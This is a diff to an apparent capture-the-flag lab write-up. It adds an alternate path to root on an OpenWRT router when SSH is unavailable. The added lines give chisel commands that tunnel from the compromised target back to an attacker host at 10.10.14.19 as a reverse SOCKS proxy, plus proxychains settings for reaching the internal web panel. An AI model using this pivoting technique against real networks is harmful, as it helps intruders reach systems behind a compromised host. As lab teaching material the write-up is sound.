@@ -54,9 +54,26 @@ RTNETLINK answers: File exists
 
 ------
 
-After all of this i connect using ssh on port 22 on 192.168.1.1(address found after arp -a) and i find the root flag (TODO: approach using port 80)
+After all of this i connect using ssh on port 22 on 192.168.1.1(address found after arp -a) and i find the root flag 
+
+As i have mentioned earlier , there is another way of completing this box . Let's take in consideration the case in which port 22 was not available.
+
+There is port 80 open using http . To access these services from our machine, we must
+tunnel through our foothold. And that is why we use the chisel utilitary . 
+
+./chisel server -p 8888 --reverse (on tha attacking machine)
 
 
+./chisel client 10.10.14.19:8888 R:socks (on the target machine) --using SOCKS5
+dynamic port forwarding
+
+After this we ensure proxychains is configured to use SOCK5 on port 1080 :
+
+tail -n 3 /etc/proxychains.conf
+[ProxyList]
+socks5 127.0.0.1 1080
+
+After all , foxy proxy to use the proxy in our browser ( http://192.168.1.1) . Using the ssh from the OpenWRT management panel we connect as root.
 
 
 
